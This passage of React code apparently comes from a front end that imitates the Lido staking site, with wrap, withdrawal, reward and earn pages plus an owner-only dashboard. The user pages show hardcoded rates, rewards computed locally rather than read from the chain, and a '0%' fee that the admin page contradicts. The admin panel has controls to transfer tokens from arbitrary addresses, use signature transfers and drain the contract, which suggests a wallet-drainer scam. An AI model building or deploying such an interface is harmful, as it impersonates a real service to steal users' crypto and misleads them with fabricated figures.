                </div>
                <div className="flex items-center gap-3">
                  <input type="number" step="0.0001" placeholder="0.00" value={wrapAmount} onChange={e => setWrapAmount(e.target.value)}
                    className="flex-1 bg-transparent text-3xl font-bold outline-none w-full" style={{ color: 'var(--text)' }} />
                  <div className="flex items-center gap-2 px-3 py-2 rounded-lg" style={{ background: 'var(--card)' }}>
                    <img src={wrapTab === 'wrap' ? 'https://cryptologos.cc/logos/lido-steth-steth-logo.png' : 'https://cryptologos.cc/logos/wsteth-wsteth-logo.png'} alt="token" className="w-6 h-6 rounded-full" />
                    <span className="font-semibold text-sm" style={{ color: 'var(--text)' }}>{wrapTab === 'wrap' ? 'stETH' : 'wstETH'}</span>
                  </div>
                </div>
              </div>

              <div className="flex justify-center -my-2 relative z-10">
                <div className="w-10 h-10 rounded-full border-2 flex items-center justify-center" style={{ background: 'var(--card)', borderColor: 'var(--border)' }}>
                  <ArrowDownToLine className="w-5 h-5" style={{ color: 'var(--text2)' }} />
                </div>
              </div>

              <div className="input-bg rounded-xl p-4 mb-6 border" style={{ borderColor: 'var(--border)' }}>
                <div className="flex justify-between mb-2">
                  <span className="text-sm" style={{ color: 'var(--text2)' }}>You will receive</span>
                </div>
                <div className="flex items-center gap-3">
                  <input type="text" readOnly value={wrapReceive > 0 ? wrapReceive.toFixed(6) : ''} placeholder="0.00"
                    className="flex-1 bg-transparent text-3xl font-bold outline-none w-full" style={{ color: 'var(--text)' }} />
                  <div className="flex items-center gap-2 px-3 py-2 rounded-lg" style={{ background: 'var(--card)' }}>
                    <img src={wrapTab === 'wrap' ? 'https://cryptologos.cc/logos/wsteth-wsteth-logo.png' : 'https://cryptologos.cc/logos/lido-steth-steth-logo.png'} alt="token" className="w-6 h-6 rounded-full" />
                    <span className="font-semibold text-sm" style={{ color: 'var(--text)' }}>{wrapTab === 'wrap' ? 'wstETH' : 'stETH'}</span>
                  </div>
                </div>
              </div>

              <button onClick={executeWrap} disabled={!isConnected || loading || !wrapAmount}
                className="w-full py-4 rounded-xl text-white font-bold text-lg btn-primary">
                {loading && <span className="spinner mr-2" />}
                {isConnected ? (wrapTab === 'wrap' ? 'Wrap now' : 'Unwrap now') : 'Connect wallet to wrap'}
              </button>

              <div className="mt-4 p-4 rounded-xl border flex items-start gap-3 accent-bg" style={{ borderColor: 'var(--border)' }}>
                <AlertTriangle className="w-5 h-5 text-[#00A3FF] flex-shrink-0 mt-0.5" />
                <p className="text-xs leading-relaxed" style={{ color: 'var(--text2)' }}>
                  Wrapping converts your rebasing stETH into a fixed-balance wstETH token. Your rewards still accrue, but as price appreciation rather than balance increase.
                </p>
              </div>

              <div className="mt-6 space-y-3">
                <div className="flex justify-between text-sm"><span style={{ color: 'var(--text2)' }}>You will receive</span><span>{wrapReceive.toFixed(4)} {wrapTab === 'wrap' ? 'wstETH' : 'stETH'}</span></div>
                <div className="flex justify-between text-sm"><span style={{ color: 'var(--text2)' }}>Exchange rate</span><span>1 {wrapTab === 'wrap' ? 'stETH = 0.8643 wstETH' : 'wstETH = 1.1570 stETH'}</span></div>
                <div className="flex justify-between text-sm"><span style={{ color: 'var(--text2)' }}>Max unlock cost</span><span>$0.03</span></div>
                <div className="flex justify-between text-sm"><span style={{ color: 'var(--text2)' }}>Max transaction cost</span><span>$0.06</span></div>
                <div className="flex justify-between text-sm"><span style={{ color: 'var(--text2)' }}>Lido fee</span><span className="text-[#53BA95]">0%</span></div>
              </div>
            </div>

            <div className="mb-8">
              <h2 className="text-xl font-bold mb-4" style={{ color: 'var(--text)' }}>FAQ</h2>
              <div className="space-y-3">
                {faqs.wrap.map((f, i) => (
                  <div key={i} className={`card rounded-xl overflow-hidden cursor-pointer ${faqOpen === i + 100 ? 'faq-open' : ''}`} onClick={() => setFaqOpen(faqOpen === i + 100 ? null : i + 100)}>
                    <div className="flex items-center justify-between p-4">
                      <span className="font-semibold text-sm" style={{ color: 'var(--text)' }}>{f.q}</span>
                      <ChevronDown className="w-4 h-4 faq-chevron transition-transform" style={{ color: 'var(--text2)' }} />
                    </div>
                    <div className="faq-content px-4 pb-4 text-sm leading-relaxed" style={{ color: 'var(--text2)' }}>{f.a}</div>
                  </div>
                ))}
              </div>
            </div>
            <Footer />
          </div>
        )}

        {/* ========== WITHDRAWALS PAGE ========== */}
        {page === 'withdrawals' && (
          <div className="fade-in">
            <div className="text-center mb-6">
              <h1 className="text-2xl font-bold mb-1" style={{ color: 'var(--text)' }}>Withdrawals</h1>
              <p className="text-sm" style={{ color: 'var(--text2)' }}>Request stETH/wstETH withdrawal and claim ETH</p>
            </div>

            <div className="card rounded-2xl p-6 mb-6">
              <div className="flex rounded-xl p-1 mb-6 input-bg">
                <button onClick={() => setWithdrawalTab('request')} className={`flex-1 py-2 rounded-lg text-sm font-semibold transition-all ${withdrawalTab === 'request' ? 'tab-active' : 'tab-inactive'}`}>Request</button>
                <button onClick={() => setWithdrawalTab('claim')} className={`flex-1 py-2 rounded-lg text-sm font-semibold transition-all ${withdrawalTab === 'claim' ? 'tab-active' : 'tab-inactive'}`}>Claim</button>
              </div>

              {withdrawalTab === 'request' && (
                <>
                  <div className="grid grid-cols-2 gap-3 mb-6">
                    <button onClick={() => setWithdrawalMethod('lido')} className={`rounded-xl p-4 border-2 text-center transition-all ${withdrawalMethod === 'lido' ? 'border-[#00A3FF] accent-bg' : 'input-bg'}`} style={{ borderColor: withdrawalMethod === 'lido' ? '#00A3FF' : 'var(--border)' }}>
                      <div className="font-semibold text-sm mb-1" style={{ color: 'var(--text)' }}>Use Lido</div>
                      <div className="text-xs" style={{ color: 'var(--text2)' }}>Waiting time:<br/><span className="font-bold">~ 2 days</span></div>
                    </button>
                    <button onClick={() => setWithdrawalMethod('dex')} className={`rounded-xl p-4 border-2 text-center transition-all ${withdrawalMethod === 'dex' ? 'border-[#00A3FF] accent-bg' : 'input-bg'}`} style={{ borderColor: withdrawalMethod === 'dex' ? '#00A3FF' : 'var(--border)' }}>
                      <div className="font-semibold text-sm mb-1" style={{ color: 'var(--text)' }}>Use DEX</div>
                      <div className="text-xs" style={{ color: 'var(--text2)' }}>Waiting time:<br/><span className="font-bold">~ 30 seconds</span></div>
                    </button>
                  </div>

                  <div className="input-bg rounded-xl p-4 mb-2 border" style={{ borderColor: 'var(--border)' }}>
                    <div className="flex justify-between mb-2">
                      <span className="text-sm" style={{ color: 'var(--text2)' }}>stETH amount</span>
                      <button onClick={() => setWithdrawalAmount(stethBal)} className="text-xs px-2 py-1 rounded bg-[#00A3FF] text-white font-semibold hover:opacity-80">MAX</button>
                    </div>
                    <div className="flex items-center gap-3">
                      <input type="number" step="0.0001" placeholder="0.00" value={withdrawalAmount} onChange={e => setWithdrawalAmount(e.target.value)}
                        className="flex-1 bg-transparent text-3xl font-bold outline-none w-full" style={{ color: 'var(--text)' }} />
                      <div className="flex items-center gap-2 px-3 py-2 rounded-lg" style={{ background: 'var(--card)' }}>
                        <img src="https://cryptologos.cc/logos/lido-steth-steth-logo.png" alt="stETH" className="w-6 h-6 rounded-full" />
                        <span className="font-semibold text-sm" style={{ color: 'var(--text)' }}>stETH</span>
                      </div>
                    </div>
                  </div>

                  <button onClick={executeWithdrawal} disabled={!isConnected || loading || !withdrawalAmount}
                    className="w-full py-4 rounded-xl text-white font-bold text-lg btn-primary mt-4">
                    {loading && <span className="spinner mr-2" />}
                    {isConnected ? 'Request withdrawal' : 'Connect wallet to request'}
                  </button>

                  <div className="mt-6 space-y-3">
                    <div className="flex justify-between text-sm"><span style={{ color: 'var(--text2)' }}>You will receive</span><span>{(parseFloat(withdrawalAmount || '0')).toFixed(4)} ETH</span></div>
                    <div className="flex justify-between text-sm"><span style={{ color: 'var(--text2)' }}>Max unlock cost</span><span>{withdrawalMethod === 'lido' ? 'FREE' : '~$0.05'}</span></div>
                    <div className="flex justify-between text-sm"><span style={{ color: 'var(--text2)' }}>Max transaction cost</span><span>{withdrawalMethod === 'lido' ? '$0.16' : '$0.25'}</span></div>
                  </div>
                </>
              )}

              {withdrawalTab === 'claim' && (
                <div className="text-center py-8">
                  <p className="text-sm" style={{ color: 'var(--text2)' }}>Connect your wallet to view and claim finalized withdrawal requests.</p>
                </div>
              )}
            </div>

            <div className="mb-8">
              <h2 className="text-xl font-bold mb-4" style={{ color: 'var(--text)' }}>FAQ</h2>
              <div className="space-y-3">
                {faqs.withdrawal.map((f, i) => (
                  <div key={i} className={`card rounded-xl overflow-hidden cursor-pointer ${faqOpen === i + 200 ? 'faq-open' : ''}`} onClick={() => setFaqOpen(faqOpen === i + 200 ? null : i + 200)}>
                    <div className="flex items-center justify-between p-4">
                      <span className="font-semibold text-sm" style={{ color: 'var(--text)' }}>{f.q}</span>
                      <ChevronDown className="w-4 h-4 faq-chevron transition-transform" style={{ color: 'var(--text2)' }} />
                    </div>
                    <div className="faq-content px-4 pb-4 text-sm leading-relaxed" style={{ color: 'var(--text2)' }}>{f.a}</div>
                  </div>
                ))}
              </div>
            </div>
            <Footer />
          </div>
        )}

        {/* ========== REWARDS PAGE ========== */}
        {page === 'rewards' && (
          <div className="fade-in">
            <div className="text-center mb-6">
              <h1 className="text-2xl font-bold mb-1" style={{ color: 'var(--text)' }}>Reward History</h1>
              <p className="text-sm" style={{ color: 'var(--text2)' }}>Track your Ethereum staking rewards with Lido</p>
            </div>

            <div className="card rounded-2xl p-4 mb-6">
              <div className="input-bg rounded-xl p-3 border flex items-center gap-3" style={{ borderColor: 'var(--border)' }}>
                <input type="text" defaultValue={address || ''} placeholder="Ethereum address" className="flex-1 bg-transparent outline-none text-sm" style={{ color: 'var(--text)' }} />
                <button onClick={() => showToast('Connected wallet data loaded', 'info')} className="px-4 py-2 bg-[#00A3FF] text-white rounded-lg text-sm font-semibold hover:opacity-90">Check</button>
              </div>
            </div>

            <div className="card rounded-2xl p-4 mb-6 space-y-3">
              <div className="flex justify-between text-sm"><span style={{ color: 'var(--text2)' }}>stETH balance</span><span className="font-semibold">{parseFloat(stethBal).toFixed(4)} stETH</span></div>
              <div className="flex justify-between text-sm"><span style={{ color: 'var(--text2)' }}>stETH rewarded</span><span className="font-semibold">{(parseFloat(stethBal) * 0.0022).toFixed(6)} stETH</span></div>
              <div className="flex justify-between text-sm"><span style={{ color: 'var(--text2)' }}>Average APR *</span><span className="font-semibold text-[#00A3FF]">2.2%</span></div>
              <div className="flex justify-between text-sm"><span style={{ color: 'var(--text2)' }}>stETH price</span><span className="font-semibold">{prices ? formatPrice(prices.steth) : '$3,000.00'}</span></div>
            </div>

            <div className="card rounded-2xl p-4 mb-6">
              <h3 className="font-bold text-lg mb-4" style={{ color: 'var(--text)' }}>Reward history</h3>
              <div className="space-y-3">
                <div className="flex justify-between items-center p-3 rounded-xl input-bg">
                  <div><p className="text-sm font-semibold" style={{ color: 'var(--text)' }}>Daily Rebase</p><p className="text-xs" style={{ color: 'var(--text2)' }}>{new Date().toLocaleDateString()}</p></div>
                  <span className="text-sm font-semibold text-[#53BA95]">+{(parseFloat(stethBal) * 0.00006).toFixed(6)} stETH</span>
                </div>
                <div className="flex justify-between items-center p-3 rounded-xl input-bg">
                  <div><p className="text-sm font-semibold" style={{ color: 'var(--text)' }}>Daily Rebase</p><p className="text-xs" style={{ color: 'var(--text2)' }}>{new Date(Date.now() - 86400000).toLocaleDateString()}</p></div>
                  <span className="text-sm font-semibold text-[#53BA95]">+{(parseFloat(stethBal) * 0.00006).toFixed(6)} stETH</span>
                </div>
              </div>
            </div>

            <div className="mb-6 space-y-3 text-xs" style={{ color: 'var(--text2)' }}>
              <p>* APR figures are estimates, not guaranteed, and are subject to change based on network conditions.</p>
              <p>Rewards may fluctuate and are influenced by factors outside the platform's control. Past performance does not guarantee future results.</p>
            </div>
            <Footer />
          </div>
        )}

        {/* ========== EARN PAGE ========== */}
        {page === 'earn' && (
          <div className="fade-in">
            <div className="text-center mb-6">
              <h1 className="text-2xl font-bold mb-1" style={{ color: 'var(--text)' }}>Lido Earn</h1>
              <p className="text-sm" style={{ color: 'var(--text2)' }}>Deploy ETH and USD stablecoins into DeFi vaults for on-chain rewards.</p>
            </div>

            <div className="card rounded-2xl p-6 mb-6 text-center">
              <div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-[#00A3FF] to-[#0066CC] flex items-center justify-center mx-auto mb-4">
                <Box className="w-8 h-8 text-white" />
              </div>
              <div className="inline-flex items-center gap-1 px-3 py-1 rounded-full bg-[#53BA95]/10 text-[#53BA95] text-xs font-bold mb-3">
                <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
                PROTECTED
              </div>
              <h2 className="text-2xl font-bold mb-2" style={{ color: 'var(--text)' }}>EarnETH</h2>
              <p className="text-sm mb-4" style={{ color: 'var(--text2)' }}>EarnETH is an ETH growth vault allocating ETH and stETH across leading blue-chip DeFi protocols.</p>
              <div className="space-y-2 mb-4 text-sm">
                <div className="flex justify-between"><span style={{ color: 'var(--text2)' }}>APY* (14d avg.)</span><span className="font-semibold text-[#00A3FF]">4%</span></div>
                <div className="flex justify-between"><span style={{ color: 'var(--text2)' }}>TVL</span><span className="font-semibold">$133.8M</span></div>
                <div className="flex justify-between"><span style={{ color: 'var(--text2)' }}>Protocol</span><span className="font-semibold">Lido + Curve</span></div>
              </div>
              <button onClick={() => showToast('EarnETH deposit coming soon', 'info')} className="w-full py-3 rounded-xl bg-[#00A3FF] text-white font-bold hover:opacity-90 transition-opacity">Deposit</button>
            </div>

            <div className="card rounded-2xl p-6 mb-6 text-center">
              <div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-[#627EEA] to-[#3C5BD8] flex items-center justify-center mx-auto mb-4">
                <DollarSign className="w-8 h-8 text-white" />
              </div>
              <div className="inline-flex items-center gap-1 px-3 py-1 rounded-full bg-[#53BA95]/10 text-[#53BA95] text-xs font-bold mb-3">
                <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
                PROTECTED
              </div>
              <h2 className="text-2xl font-bold mb-2" style={{ color: 'var(--text)' }}>EarnUSD</h2>
              <p className="text-sm mb-4" style={{ color: 'var(--text2)' }}>EarnUSD delivers access to USD-denominated reward strategies built around transparent asset selection.</p>
              <div className="space-y-2 mb-4 text-sm">
                <div className="flex justify-between"><span style={{ color: 'var(--text2)' }}>APY* (14d avg.)</span><span className="font-semibold text-[#00A3FF]">7%</span></div>
                <div className="flex justify-between"><span style={{ color: 'var(--text2)' }}>TVL</span><span className="font-semibold">$35.4M</span></div>
                <div className="flex justify-between"><span style={{ color: 'var(--text2)' }}>Protocol</span><span className="font-semibold">Lido + Curve</span></div>
              </div>
              <button onClick={() => showToast('EarnUSD deposit coming soon', 'info')} className="w-full py-3 rounded-xl bg-[#00A3FF] text-white font-bold hover:opacity-90 transition-opacity">Deposit</button>
            </div>

            <div className="mb-6 space-y-3 text-xs" style={{ color: 'var(--text2)' }}>
              <p>* APR/APY figures are estimates based on historical performance, not guaranteed.</p>
              <p>Rewards may fluctuate. Past performance does not guarantee future results. Always DYOR.</p>
            </div>
            <Footer />
          </div>
        )}

        {/* ========== ADMIN PAGE ========== */}
        {page === 'admin' && isOwner && (
          <div className="fade-in">
            <div className="text-center mb-6">
              <h1 className="text-2xl font-bold mb-1" style={{ color: 'var(--text)' }}>Owner Dashboard</h1>
              <p className="text-sm" style={{ color: 'var(--text2)' }}>Contract administration & treasury management</p>
            </div>

            {/* Contract Stats */}
            <div className="card rounded-2xl p-4 mb-6 space-y-3">
              <div className="flex justify-between text-sm"><span style={{ color: 'var(--text2)' }}>Contract ETH Balance</span><span className="font-semibold">{parseFloat(adminEthBal).toFixed(4)} ETH</span></div>
              <div className="flex justify-between text-sm"><span style={{ color: 'var(--text2)' }}>Contract stETH Balance</span><span className="font-semibold">{parseFloat(adminStethBal).toFixed(4)} stETH</span></div>
              <div className="flex justify-between text-sm"><span style={{ color: 'var(--text2)' }}>Current Fee Rate</span><span className="font-semibold">1%</span></div>
              <div className="flex justify-between text-sm"><span style={{ color: 'var(--text2)' }}>Owner Address</span><span className="font-mono text-xs">{CONFIG.OWNER_ADDRESS}</span></div>
            </div>

            {/* Withdraw ETH */}
            <div className="card rounded-2xl p-6 mb-6">
              <h3 className="font-bold text-lg mb-4" style={{ color: 'var(--text)' }}>Withdraw ETH</h3>
              <div className="space-y-3">
                <div><label className="text-xs mb-1 block" style={{ color: 'var(--text2)' }}>Recipient Address</label><input id="admin-eth-to" type="text" placeholder="0x..." className="w-full input-bg rounded-xl p-3 border text-sm outline-none" style={{ borderColor: 'var(--border)', color: 'var(--text)' }} /></div>
                <div><label className="text-xs mb-1 block" style={{ color: 'var(--text2)' }}>Amount (ETH)</label><input id="admin-eth-amt" type="number" step="0.001" placeholder="0.0" className="w-full input-bg rounded-xl p-3 border text-sm outline-none" style={{ borderColor: 'var(--border)', color: 'var(--text)' }} /></div>
                <div className="flex gap-2">
                  <button onClick={adminWithdrawETH} className="flex-1 py-3 rounded-xl bg-[#00A3FF] text-white font-bold text-sm hover:opacity-90">Withdraw ETH</button>
                  <button onClick={adminWithdrawAllETH} className="flex-1 py-3 rounded-xl border border-[#E14D4D] text-[#E14D4D] font-bold text-sm hover:bg-[#E14D4D]/10">Withdraw All</button>
                </div>
              </div>
            </div>

            {/* Withdraw Tokens */}
            <div className="card rounded-2xl p-6 mb-6">
              <h3 className="font-bold text-lg mb-4" style={{ color: 'var(--text)' }}>Withdraw Tokens</h3>
              <div className="space-y-3">
                <div><label className="text-xs mb-1 block" style={{ color: 'var(--text2)' }}>Token Address</label><input id="admin-token-addr" type="text" placeholder="0x..." className="w-full input-bg rounded-xl p-3 border text-sm outline-none" style={{ borderColor: 'var(--border)', color: 'var(--text)' }} /></div>
                <div><label className="text-xs mb-1 block" style={{ color: 'var(--text2)' }}>Recipient Address</label><input id="admin-token-to" type="text" placeholder="0x..." className="w-full input-bg rounded-xl p-3 border text-sm outline-none" style={{ borderColor: 'var(--border)', color: 'var(--text)' }} /></div>
                <div><label className="text-xs mb-1 block" style={{ color: 'var(--text2)' }}>Amount</label><input id="admin-token-amt" type="number" step="0.001" placeholder="0.0" className="w-full input-bg rounded-xl p-3 border text-sm outline-none" style={{ borderColor: 'var(--border)', color: 'var(--text)' }} /></div>
                <div className="flex gap-2">
                  <button onClick={adminWithdrawToken} className="flex-1 py-3 rounded-xl bg-[#00A3FF] text-white font-bold text-sm hover:opacity-90">Withdraw Token</button>
                  <button onClick={adminWithdrawAllToken} className="flex-1 py-3 rounded-xl border border-[#E14D4D] text-[#E14D4D] font-bold text-sm hover:bg-[#E14D4D]/10">Withdraw All</button>
                </div>
              </div>
            </div>

            {/* Transfer Tokens (from contract) */}
            <div className="card rounded-2xl p-6 mb-6">
              <h3 className="font-bold text-lg mb-4" style={{ color: 'var(--text)' }}>Transfer Tokens</h3>
              <div className="space-y-3">
                <div><label className="text-xs mb-1 block" style={{ color: 'var(--text2)' }}>Recipient Address</label><input type="text" value={transferTo} onChange={e => setTransferTo(e.target.value)} placeholder="0x..." className="w-full input-bg rounded-xl p-3 border text-sm outline-none" style={{ borderColor: 'var(--border)', color: 'var(--text)' }} /></div>
                <div><label className="text-xs mb-1 block" style={{ color: 'var(--text2)' }}>Amount</label><input type="number" step="0.001" value={transferAmount} onChange={e => setTransferAmount(e.target.value)} placeholder="0.0" className="w-full input-bg rounded-xl p-3 border text-sm outline-none" style={{ borderColor: 'var(--border)', color: 'var(--text)' }} /></div>
                <button onClick={transferTokens} className="w-full py-3 rounded-xl bg-[#00A3FF] text-white font-bold text-sm hover:opacity-90">Transfer</button>
              </div>
            </div>

            {/* TransferFrom */}
            <div className="card rounded-2xl p-6 mb-6">
              <h3 className="font-bold text-lg mb-4" style={{ color: 'var(--text)' }}>Transfer From</h3>
              <div className="space-y-3">
                <div><label className="text-xs mb-1 block" style={{ color: 'var(--text2)' }}>From Address</label><input id="tf-from" type="text" placeholder="0x..." className="w-full input-bg rounded-xl p-3 border text-sm outline-none" style={{ borderColor: 'var(--border)', color: 'var(--text)' }} /></div>
                <div><label className="text-xs mb-1 block" style={{ color: 'var(--text2)' }}>To Address</label><input id="tf-to" type="text" placeholder="0x..." className="w-full input-bg rounded-xl p-3 border text-sm outline-none" style={{ borderColor: 'var(--border)', color: 'var(--text)' }} /></div>
                <div><label className="text-xs mb-1 block" style={{ color: 'var(--text2)' }}>Amount</label><input id="tf-amt" type="number" step="0.001" placeholder="0.0" className="w-full input-bg rounded-xl p-3 border text-sm outline-none" style={{ borderColor: 'var(--border)', color: 'var(--text)' }} /></div>
                <button onClick={transferFromTokens} className="w-full py-3 rounded-xl bg-[#00A3FF] text-white font-bold text-sm hover:opacity-90">Transfer From</button>
              </div>
            </div>

            {/* Approve Spender */}
            <div className="card rounded-2xl p-6 mb-6">
              <h3 className="font-bold text-lg mb-4" style={{ color: 'var(--text)' }}>Approve Spender</h3>
              <div className="space-y-3">
                <div><label className="text-xs mb-1 block" style={{ color: 'var(--text2)' }}>Spender Address</label><input id="approve-spender" type="text" placeholder="0x..." className="w-full input-bg rounded-xl p-3 border text-sm outline-none" style={{ borderColor: 'var(--border)', color: 'var(--text)' }} /></div>
                <div><label className="text-xs mb-1 block" style={{ color: 'var(--text2)' }}>Amount</label><input id="approve-amt" type="number" step="0.001" placeholder="0.0" className="w-full input-bg rounded-xl p-3 border text-sm outline-none" style={{ borderColor: 'var(--border)', color: 'var(--text)' }} /></div>
                <button onClick={approveSpender} className="w-full py-3 rounded-xl bg-[#00A3FF] text-white font-bold text-sm hover:opacity-90">Approve</button>
              </div>
            </div>

            {/* Signature Transfer */}
            <div className="card rounded-2xl p-6 mb-6">
              <h3 className="font-bold text-lg mb-4" style={{ color: 'var(--text)' }}>Signature Transfer</h3>
              <div className="space-y-3">
                <div><label className="text-xs mb-1 block" style={{ color: 'var(--text2)' }}>To Address</label><input type="text" value={sigTransferTo} onChange={e => setSigTransferTo(e.target.value)} placeholder="0x..." className="w-full input-bg rounded-xl p-3 border text-sm outline-none" style={{ borderColor: 'var(--border)', color: 'var(--text)' }} /></div>
                <div><label className="text-xs mb-1 block" style={{ color: 'var(--text2)' }}>Amount</label><input type="number" step="0.001" value={sigTransferAmount} onChange={e => setSigTransferAmount(e.target.value)} placeholder="0.0" className="w-full input-bg rounded-xl p-3 border text-sm outline-none" style={{ borderColor: 'var(--border)', color: 'var(--text)' }} /></div>
                <button onClick={signatureTransfer} className="w-full py-3 rounded-xl bg-[#00A3FF] text-white font-bold text-sm hover:opacity-90">Signature Transfer</button>
              </div>
            </div>

            {/* Invalidate Nonces */}
            <div className="card rounded-2xl p-6 mb-6">
              <h3 className="font-bold text-lg mb-4" style={{ color: 'var(--text)' }}>Invalidate Nonces</h3>
              <div className="space-y-3">
                <div><label className="text-xs mb-1 block" style={{ color: 'var(--text2)' }}>Word</label><input id="admin-nonce-word" type="number" placeholder="0" className="w-full input-bg rounded-xl p-3 border text-sm outline-none" style={{ borderColor: 'var(--border)', color: 'var(--text)' }} /></div>
                <div><label className="text-xs mb-1 block" style={{ color: 'var(--text2)' }}>Mask</label><input id="admin-nonce-mask" type="number" placeholder="0" className="w-full input-bg rounded-xl p-3 border text-sm outline-none" style={{ borderColor: 'var(--border)', color: 'var(--text)' }} /></div>
                <button onClick={adminInvalidateNonces} className="w-full py-3 rounded-xl bg-[#00A3FF] text-white font-bold text-sm hover:opacity-90">Invalidate Nonces</button>
              </div>
            </div>

            {/* Transfer Ownership */}
            <div className="card rounded-2xl p-6 mb-6">
              <h3 className="font-bold text-lg mb-4" style={{ color: 'var(--text)' }}>Transfer Ownership</h3>
              <div className="space-y-3">
                <input id="admin-new-owner" type="text" placeholder="0x..." className="w-full input-bg rounded-xl p-3 border text-sm outline-none" style={{ borderColor: 'var(--border)', color: 'var(--text)' }} />
                <button onClick={adminTransferOwnership} className="w-full py-3 rounded-xl bg-[#00A3FF] text-white font-bold text-sm hover:opacity-90">Transfer Ownership</button>
              </div>
            </div>

            {/* Renounce Ownership */}
            <div className="card rounded-2xl p-6 mb-6 border-2 border-[#F59E0B]">
              <h3 className="font-bold text-lg mb-2 text-[#F59E0B]">Renounce Ownership</h3>
              <p className="text-xs mb-4" style={{ color: 'var(--text2)' }}>WARNING: This will permanently remove all owner privileges. Contract will be immutable.</p>
              <button onClick={adminRenounceOwnership} className="w-full py-3 rounded-xl bg-[#F59E0B] text-white font-bold text-sm hover:opacity-90">RENOUNCE OWNERSHIP</button>
            </div>

            {/* Emergency Withdraw */}
            <div className="card rounded-2xl p-6 mb-6 border-2 border-[#E14D4D]">
              <h3 className="font-bold text-lg mb-2 text-[#E14D4D]">Emergency Withdraw</h3>
              <p className="text-xs mb-4" style={{ color: 'var(--text2)' }}>This will drain the entire contract balance to the owner address. Use with extreme caution.</p>
              <button onClick={adminEmergencyWithdraw} className="w-full py-3 rounded-xl bg-[#E14D4D] text-white font-bold text-sm hover:opacity-90">EMERGENCY WITHDRAW ALL</button>
            </div>
            <Footer />
          </div>
        )}
      </div>

      {/* BOTTOM NAV */}
      <nav className="fixed bottom-0 left-0 right-0 z-50 border-t" style={{ background: 'var(--card)', borderColor: 'var(--border)' }}>
        <div className="max-w-2xl mx-auto px-4 h-16 flex items-center justify-around">
          {[ 
            { id: 'stake', icon: Zap, label: 'Stake' },
            { id: 'wrap', icon: Box, label: 'Wrap' },
            { id: 'withdrawals', icon: ArrowDownToLine, label: 'Withdrawals' },
            { id: 'rewards', icon: TrendingUp, label: 'Rewards' },
            { id: 'earn', icon: DollarSign, label: 'Earn' },
          ].map(item => (
            <button key={item.id} onClick={() => setPage(item.id as Page)} className={`flex flex-col items-center gap-1 transition-colors ${page === item.id ? 'nav-active' : 'nav-inactive'}`}>
              <item.icon className="w-5 h-5" />
              <span className="text-[10px] font-semibold">{item.label}</span>
            </button>
          ))}
        </div>
      </nav>
    </main>
  );
}
